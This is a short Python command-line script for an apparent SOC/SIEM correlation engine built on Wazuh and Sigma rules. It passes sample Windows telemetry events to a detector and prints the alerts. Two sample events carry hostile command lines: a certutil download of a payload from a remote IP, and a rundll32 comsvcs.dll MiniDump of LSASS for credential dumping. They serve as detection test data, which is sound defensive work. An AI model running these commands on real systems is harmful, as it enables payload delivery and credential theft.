# -*- coding: utf-8 -*-
"""
SOC SIEM Correlation Engine CLI
Author: Toprak Ahmet Aydoğmuş
"""
import argparse
import json
from engine.wazuh_sigma_correlator import WazuhSigmaCorrelator

def main():
    parser = argparse.ArgumentParser(description="SOC SIEM Event Correlation CLI")
    parser.add_argument("--simulate-stream", action="store_true", help="Simulate a live telemetry stream")
    args = parser.parse_args()

    correlator = WazuhSigmaCorrelator()
    sample_events = [
        {"agent": {"name": "srv-prod01"}, "data": {"win": {"eventdata": {"image": "certutil.exe", "commandLine": "certutil.exe -urlcache -split -f http://198.51.100.10/payload.bin"}}},
        {"agent": {"name": "srv-db02"}, "data": {"win": {"eventdata": {"image": "rundll32.exe", "commandLine": "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 624 lsass.dmp full"}}},
        {"agent": {"name": "wk-user10"}, "data": {"win": {"eventdata": {"image": "notepad.exe", "commandLine": "notepad.exe notes.txt"}}}
    ]

    print("[*] Processing Ingested SOC Telemetry Stream...")
    for ev in sample_events:
        alerts = correlator.evaluate_telemetry(ev)
        if alerts:
            for a in alerts:
                print(f"[!] ALERT: [{a['severity']}] {a['title']} on {a['host']} (MITRE: {a['mitre']})")
        else:
            print(f"[+] Baseline event passed from {ev['agent']['name']}")

    print("\n[*] Summary Metrics:", json.dumps(correlator.get_soc_metrics(), indent=2))

if __name__ == "__main__":
    main()
